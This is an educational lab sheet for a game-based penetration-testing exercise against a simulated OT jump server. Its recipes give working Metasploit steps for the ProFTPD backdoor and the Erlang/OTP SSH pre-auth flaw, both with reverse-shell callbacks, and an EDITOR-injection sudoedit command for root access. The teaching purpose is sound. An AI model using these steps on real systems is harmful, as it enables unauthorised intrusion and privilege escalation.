---
title: "Critical Failure: VM Technical Steps"
author: ["Z. Cliffe Schreuders"]
license: "CC BY-SA 4.0"
description: "Technical companion to the Critical Failure walkthrough, for the OT jump server work: step-by-step hints for scanning the server, reaching its FTP and SSH services, escalating to root with sudo and submitting the four flags, plus command-line practice."
tags: ["nmap", "service-enumeration", "ftp", "ssh", "erlang", "privilege-escalation", "sudo", "scada", "break-escape"]
categories: ["introducing_attacks"]
type: ["game-based-learning", "lab-sheet"]
difficulty: "intermediate"
source: "https://github.com/cliffe/BreakEscape/blob/main/scenarios/m04_critical_failure/labsheet_vm_steps.md"
cybok:
  - ka: "NS"
    topic: "Network Security"
    keywords: ["Network scanning (Nmap)", "Service enumeration"]
  - ka: "SOIM"
    topic: "PENETRATION TESTING"
    keywords: ["PENETRATION TESTING - SOFTWARE TOOLS", "VULNERABILITY ANALYSIS / VULNERABILITY SCANNING"]
  - ka: "MAT"
    topic: "Attacks and exploitation"
    keywords: ["EXPLOITATION", "Remote code execution"]
  - ka: "SS"
    topic: "Systems Security"
    keywords: ["Vulnerability exploitation", "Linux security"]
  - ka: "OSV"
    topic: "Primitives for Isolation and Mediation"
    keywords: ["Privilege escalation"]
  - ka: "CPS"
    topic: "Cyber-Physical Systems / Physical Security"
    keywords: ["SCADA/ICS protection"]
---

> Note: This is the technical companion to the [Critical Failure walkthrough](https://cliffe.github.io/HacktivityLabSheets/labs/introducing_attacks/m04-critical-failure/). Play the game there first, and come here for the server work.

## Concepts: the Server Work

Three ideas carry the server work: finding what a host runs, what it means for a service to need no login, and how sudo decides who may run what.

### Port scanning and service versions {#concept-scan}

A scanner sends a short probe to each port and records what answers. An open port tells you a service is listening. A version scan goes further and asks the service to name itself, so you learn the software and its version, not only the number.

| What you see | What it probably is | What to try |
|--------------|---------------------|-------------|
| A web port that answers with a page | A web server with something to read | Open it and read every line |
| A port that answers with an SSH banner, but not OpenSSH | A different SSH implementation | Check the version against known flaws |
| Nothing on the common ports | The interesting service is on a higher port | Scan every port, not the default list |

Worked example. A version scan of a host might print lines like these (the port and names are placeholders):

```text
PORT        STATE SERVICE  VERSION
80/tcp      open  http     <web server and version>
21/tcp      open  ftp      <FTP server and version>
<high-port> open  ssh      <a name that is not OpenSSH>
```

> Question: The web and FTP services are on their usual ports. Why would a careful tester scan every port before deciding the host has only those two?

### A flaw before the login {#concept-preauth}

Most services check who you are before they do anything for you. A pre-authentication flaw is a bug in the code that runs before that check. The daemon processes a message it should only accept from a logged-in user, so an attacker needs no password, key or account.

Think of a door guard who checks your name after you have walked into the hall. The guard is in the wrong place, and anyone can walk past the name check.

When a service is affected, its version number tells you whether the flaw is present. Vendors publish the affected version ranges in the advisory for the CVE (a standard ID for a known flaw).

> Question: If a daemon handles a message before it checks the caller, what does a version number tell you that a password prompt cannot?

### Sudo, and the sudoedit flaw {#concept-sudo}

`sudo` lets an account run specific commands as another user, usually root. Its rules live in `/etc/sudoers`, and `sudo -l` lists the rules that apply to your account.

```text
User svcacct may run the following commands:
    (root) NOPASSWD: /usr/bin/sudoedit <some file>
```

`sudoedit` opens a file for editing as another user. The editor it uses comes from an environment setting. In an affected build of sudo (CVE-2023-22809), that setting could carry extra arguments, so the editor opened a file the rule never named. A rule that looks like "edit this one file" then becomes "edit any file", and a root-only file can be opened through the editor.

The fix is a newer sudo version, and checking the version is the first step in any sudo review.

> Question: The output of `sudo -l` shows the rules. What can it not tell you about how a permitted program behaves, and how would you find out?

## Stuck? Hints: the Server Work

These six stages follow the server work in order: getting onto the attack box, mapping the jump server, the FTP and SSH footholds, root, and the drop-site. Read each hint and try it first. Open the Nudge if you need the method, and the Recipe last.

### Stage 1: Getting onto the Kali Box {#hints-vm-connect}

**Where:** the workshop terminal. **Goal:** log in to Kali and find the jump server's address.

> Hint: The terminal is a full Kali machine, and the jump server is a different machine. Both the login and the address are in the workshop, if you know where to look.

<details markdown="1">
<summary>Nudge</summary>

The Kali login is on the sticky note on the terminal. The jump server's address is in the traffic on the Network Monitoring Station, the monitor in the workshop.
**Learn it:** ==action: Before you scan anything, confirm the target answers==. A host that does not reply to a ping may still have open ports, so treat the ping as a check and not as proof.

</details>

<details markdown="1">
<summary>Recipe</summary>

1. \==action: Log in to Kali with the login on the sticky note==.
2. \==action: Note the jump server's address== from the Network Monitoring Station.
3. \==action: Check the server answers== with `ping -c 3` and that address.

</details>

### Stage 2: Mapping the Jump Server {#hints-vm-scan}

**Where:** the Kali shell. **Goal:** find every open service on the jump server and read the one that is a web page.

> Hint: Start wide, then look closer. Most of what you need is on ordinary ports, but one service is not on an ordinary port.

<details markdown="1">
<summary>Nudge</summary>

Scan every TCP port first, then ask the open ports what they are. The web service answers with a status page for the battery racks. Read the page from top to bottom: the first flag is in it. The odd high port is a second service, and the version scan will not call it OpenSSH.

**Learn it:** ==action: Compare the two scans== (the quick scan and the full one) and note which ports only the full scan found.

</details>

<details markdown="1">
<summary>Recipe</summary>

1. \==action: Scan every TCP port== on the jump server:

```bash
nmap -p- <jump-server-address>
```

2. \==action: Version-scan the open ports== the first scan found:

```bash
nmap -sV -p <open-ports> <jump-server-address>
```

3. \==action: Open the web service== in a browser on Kali, or fetch it with `curl http://<jump-server-address>/`. \==action: Read the status page== and copy the flag it shows.
4. \==action: Keep the second service's port and version== for stage 4.

</details>

> Warning: A scan of only the common ports misses the high port. Most students who think the box has one service have not run the full scan.

### Stage 3: The FTP Drop {#hints-vm-ftp}

**Where:** the Kali shell and Metasploit. **Goal:** get into the FTP service and read OptiGrid's transfer notes.

> Hint: The FTP service's version is the clue. Check it against the backdoored build you met at St Catherine's.

<details markdown="1">
<summary>Nudge</summary>

The FTP server runs a build with a backdoor, the same family you met earlier in the game. Metasploit has a module for it. Once you have a shell, the transfer notes are in OptiGrid's folder, and the flag for this step is in that folder too. Agent HaX offers the ProFTPD field guide on your phone after you submit the first flag. Ask for it there.

**Learn it:** ==action: Before you run the exploit, check the module's options==. A wrong port or a wrong callback address fails silently.

</details>

<details markdown="1">
<summary>Recipe</summary>

1. \==action: Start Metasploit== with `msfconsole`.
2. \==action: Find the module== with `search proftpd_133c`, then select it:

```text
use exploit/unix/ftp/proftpd_133c_backdoor
```

3. \==action: Set the target and your callback==, using the FTP port your scan found and the Kali address:

```text
set RHOSTS <jump-server-address>
set RPORT <ftp-port>
set LHOST <kali-address>
set LPORT <callback-port>
```

4. \==action: Run `exploit`==, then list the directory and open the transfer folder with `ls` and `cat`. \==action: Read the transfer notes== and copy the flag they contain.

</details>

> Warning: If Metasploit says no session was created, check that the callback port is free on Kali and that the jump server can reach `LHOST`.

### Stage 4: The Erlang/OTP SSH Foothold {#hints-vm-erlang}

**Where:** the Kali shell and Metasploit. **Goal:** get a command shell on the jump server without a login, and read the operator notes.

> Hint: The odd high port is an SSH service, but its version does not say OpenSSH. Look up what that software is and what it is known to get wrong.

<details markdown="1">
<summary>Nudge</summary>

The Erlang/OTP SSH daemon has a pre-authentication flaw (CVE-2025-32433). You need no username or password, and the shell you get belongs to the daemon's service account, not root. The operator notes in the OptiGrid toolkit folder hold the flag and the next step. Ask Agent HaX for the Erlang SSH guide on your phone after you submit the FTP flag.

**Learn it:** ==action: Confirm the version before you exploit it==. A patched daemon accepts the connection and does nothing.

</details>

<details markdown="1">
<summary>Recipe</summary>

1. \==action: Confirm the daemon== on its odd port:

```bash
nmap -sV -p <high-port> <jump-server-address>
```

2. \==action: Start Metasploit== and select the module:

```text
use exploit/linux/ssh/ssh_erlangotp_rce
```

3. \==action: Set the target, the port and your callback==:

```text
set RHOSTS <jump-server-address>
set RPORT <high-port>
set LHOST <kali-address>
set LPORT <callback-port>
exploit
```

4. \==action: Confirm who you are on the box==, and what this account may run:

```bash
id
hostname
sudo -l
```

5. \==action: Read the operator notes== in the OptiGrid toolkit folder and copy the flag.

</details>

> Warning: A session that opens and drops at once usually means the callback is unstable. Retry, or pick a simpler payload. The Erlang SSH channel is narrow.

### Stage 5: Root with sudoedit {#hints-vm-sudo}

**Where:** the foothold shell from stage 4. **Goal:** read a root-only file and find the flag in it.

> Hint: Your account is not root, and the file you want is root-only. Find out exactly what your account may run under sudo before you try anything clever.

<details markdown="1">
<summary>Nudge</summary>

Run `sudo -l` on the foothold. One of the permitted commands is `sudoedit`. Check the sudo version, because the flaw is in an older build. If the version is in the affected range, the rule that looks like "edit one file" can be turned into "open another file", and the editor then shows you the root-only file. The sudo field guide, offered on your phone after the FTP or Erlang flag, covers the rule listing.

**Learn it:** ==action: Look up the affected version range in the CVE advisory== before you try the technique. Confirming the version first tells you whether the attempt can work.

</details>

<details markdown="1">
<summary>Recipe</summary>

1. \==action: Confirm what you may run== with `sudo -l`, and note the `sudoedit` line.
2. \==action: Check the sudo version==:

```bash
sudo -V | head -1
```

The advisory for CVE-2023-22809 lists sudo from 1.8.0 up to and including 1.9.12p1 as affected.

3. \==action: Open the root-only file through the editor==, pointing `EDITOR` at a permitted file you can edit and the root-only path after it. The editor must accept extra arguments, as vim does:

```bash
EDITOR='vim -- <root-only-file>' sudoedit <file-you-may-edit>
```

4. \==action: Read the flag== in the editor, then quit without saving. In vim, that is `:q!`.

</details>

> Warning: Quit without saving. If you write changes to a root-owned file, you have changed the box, and the next student's run will not match your notes.

### Stage 6: Submitting the Four Flags {#hints-vm-dropsite}

**Where:** the SAFETYNET Drop-Site Terminal in the workshop. **Goal:** submit each flag you earned.

> Hint: Each flag is proof of one step, and the terminal takes them one at a time. You do not need to submit them in any particular order.

<details markdown="1">
<summary>Nudge</summary>

Each flag you read on the server is for one step, and the step's task on the objectives panel ticks when the flag is accepted. The aim that covers the server work completes once every flag is in.

**Learn it:** ==action: Look at the objectives panel after each submission==. A task that did not tick usually means the flag was copied wrong.

</details>

<details markdown="1">
<summary>Recipe</summary>

1. \==action: Go back to the workshop== and open the SAFETYNET Drop-Site Terminal.
2. \==action: Submit each flag== you copied, one at a time, with the step it belongs to.
3. \==action: Check the objectives panel== for all four submitted steps before you leave the workshop.

</details>

> Warning: Copy the flag text exactly. A flag typed from memory, or pasted with extra spaces, is refused without an error that tells you why.

## Server Errors and What They Usually Mean

| Message or symptom | Usual cause |
|--------------------|-------------|
| A port does not answer | The service is on another port, or it stopped. Rescan that port. |
| Metasploit says no session was created | The callback cannot reach Kali. Check `LHOST` and the callback port. |
| The module runs and nothing happens | The version is not in the affected range, or you picked the wrong module. Run `info` on the module. |
| `sudo -l` lists nothing you expected | You are on a different account than you think. Run `id` first. |
| `sudoedit` runs and nothing opens | The editor setting did not take. Check the sudo version, and that the editor exists on the box. |

## Try It on the Command Line (Optional)

### Scanning a machine you own {#cli-scan}

Run a full scan against your own machine, then compare it with the list of listening sockets the system keeps. ==action: Scan every port on your own machine and read the service names==:

```bash
nmap -p- -sV 127.0.0.1
ss -tlnp
```

> Warning: Only scan machines you own or have written permission to test. A scan of anyone else's system can be an offence.

> Question: Did `nmap` and `ss` agree on every port? If not, which one would you trust for a service you cannot log in to, and why?

### Reading your own sudo rules {#cli-sudo}

On a machine you own, ==action: check the sudo version and the rules that apply to your account==:

```bash
sudo -V | head -1
sudo -l
```

> Question: The version is in an affected range, but `sudo -l` does not mention `sudoedit`. Does that mean you are safe from CVE-2023-22809? What would you check next?

## After the Game: Attacking the Server

> Question: The Erlang daemon was on a port the common-ports scan misses. What would a defender do with that fact, beyond closing the port?

> Question: The Erlang flaw needs no login. Which controls would have stopped it, and which would have made no difference?

> Question: Sudo gave the foothold account a permitted command. Why is "it only edits one file" a weaker guarantee than it sounds?

> Action: Write a short scan record for the jump server: host, open ports, services with versions, the priority you would give each, and the one check you would run first. Hand it in with the sudo version you checked on the foothold.

## Further Reading

- [SAFETYNET Field Guide: Erlang/OTP SSH RCE](https://cliffe.github.io/HacktivityLabSheets/labs/safetynet/erlang-otp-ssh-rce/)
- [SAFETYNET Field Guide: Privilege Escalation via Sudo](https://cliffe.github.io/HacktivityLabSheets/labs/safetynet/privilege-escalation/)
- [SAFETYNET Field Guide: ProFTPD Exploitation Workflow](https://cliffe.github.io/HacktivityLabSheets/labs/safetynet/proftpd-exploitation-workflow/)
- [CVE-2025-32433](https://nvd.nist.gov/vuln/detail/CVE-2025-32433) (Erlang/OTP SSH)
- [CVE-2023-22809](https://nvd.nist.gov/vuln/detail/CVE-2023-22809) (sudoedit)





